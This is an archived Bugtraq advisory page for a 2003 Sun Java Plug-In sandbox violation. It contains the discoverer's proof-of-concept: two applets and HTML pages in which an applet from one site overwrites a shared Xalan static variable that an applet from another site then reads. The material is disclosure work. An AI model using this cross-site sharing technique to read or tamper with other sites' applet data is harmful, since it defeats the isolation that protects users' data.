#SpeeDr00t@Black Falcon<br>#bid8857<p><b><span style="font-size: 18pt;">Sun Java Cross-Site Applet Sandbox Security Model Violation Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/8857/info">info</a><br><a href="http://www.securityfocus.com/bid/8857/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/8857/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/8857/solution">solution</a><br><a href="http://www.securityfocus.com/bid/8857/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
<span class="title"></span><br/><br/>
<table border="0" cellpadding="4" cellspacing="0">
<tr>
<td>
<span class="label">Bugtraq ID:</span>
</td>
<td>
				8857
			</td>
</tr>
<tr>
<td>
<span class="label">Class:</span>
</td>
<td>
				Design Error
			</td>
</tr>
<tr valign="top">
<td>
<span class="label">CVE:</span>
</td>
<td>
</td>
</tr>
<tr>
<td>
<span class="label">Remote:</span>
</td>
<td>
				Yes
			</td>
</tr>
<tr>
<td>
<span class="label">Local:</span>
</td>
<td>
				No
			</td>
</tr>
<tr>
<td>
<span class="label">Published:</span>
</td>
<td>
				Oct 20 2003 12:00AM
			</td>
</tr>
<tr>
<td>
<span class="label">Updated:</span>
</td>
<td>
				Oct 20 2003 12:00AM
			</td>
</tr>
<tr>
<td>
<span class="label">Credit:</span>
</td>
<td>
				Discovery is credited to Marc Schoenefeld &lt;marc@illegalaccess.org&gt;.
			</td>
</tr>
<tr valign="top">
<td>
<span class="label">Vulnerable:</span>
</td>
<td>
				
					Sun Java Plug-In 1.4.2 _01<br/>
</td>
</tr>
<tr>
<td colspan="2">
<div class="breakline"></div>
</td>
</tr>
<tr valign="top">
<td>
<span class="label">Not Vulnerable:</span>
</td>
<td>
</td>
</tr>
</table>
</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
<span class="title"></span><br/><br/>
	The following proof-of-concept was provided to demonstrate that there is a violation of the Java sandbox security model:<br/><br/>Two applets,<br/> - one on siteA: www.siteA.org =&gt; Read.html / ReadApplet.class<br/> - one on siteB: www.siteB.org =&gt; Write.html / WriteApplet.class<br/><br/>Applet from siteB can share a variable also accessible (read and write)<br/>which is used by siteA. So data protection is not guaranteed, an unsigned<br/>applet may grab data stored in this variable by a signed applet<br/>or interfere it's XML processing and therefore violates the isolation<br/>restriction of the sandbox.<br/><br/>==========READAPPLET=========================<br/>/* Illegalaccess.org java exploit */<br/>/* coded by Marc Schoenefeld      */<br/><br/>import java.awt.Graphics;<br/><br/>public class ReadApplet extends java.applet.Applet {<br/><br/>    public void paint(Graphics g)<br/>    {<br/><br/>System.out.println(org.apache.xalan.processor.XSLProcessorVersion.S_VERSION);<br/>    }<br/><br/>   static {<br/><br/>System.out.println(org.apache.xalan.processor.XSLProcessorVersion.S_VERSION);<br/>   }<br/>}<br/>==========READAPPLET=========================<br/><br/>==========WRITEAPPLET=========================<br/>import java.awt.Graphics;<br/><br/><br/>public class WriteApplet extends java.applet.Applet {<br/>    public void paint(Graphics g)<br/>    {<br/>        org.apache.xalan.processor.XSLProcessorVersion.S_VERSION += "a";<br/>    }<br/><br/><br/>   static {<br/>      org.apache.xalan.processor.XSLProcessorVersion.S_VERSION = "altered<br/>from<br/>SiteA";<br/>  }<br/>}<br/>==========WRITEAPPLET=========================<br/><br/><br/>=========Write.html============================<br/>&lt;HTML&gt;<br/>&lt;BODY BGCOLOR=#66FF66&gt;<br/>&lt;PRE&gt;<br/>WriteApplet, write to variable<br/>Marc (marc@org.illegalaccess)<br/>&lt;/PRE&gt;<br/>&lt;applet codebase=. code=WriteApplet.class width=100 height=100&gt;<br/>&lt;/applet&gt;<br/>&lt;/BODY&gt;<br/>&lt;/HTML&gt;<br/><br/>========Read.html=============================<br/>&lt;HTML&gt;<br/>&lt;BODY BGCOLOR=#6666FF&gt;<br/>&lt;PRE&gt;<br/>ReadApplet, read from variable<br/>Marc (marc@org.illegalaccess)<br/>&lt;/PRE&gt;<br/>&lt;applet codebase=. code=ReadApplet.class width=100 height=100&gt;<br/>&lt;/applet&gt;<br/>&lt;/BODY&gt;<br/>&lt;/HTML&gt;
	
		<ul>
</ul>
</div>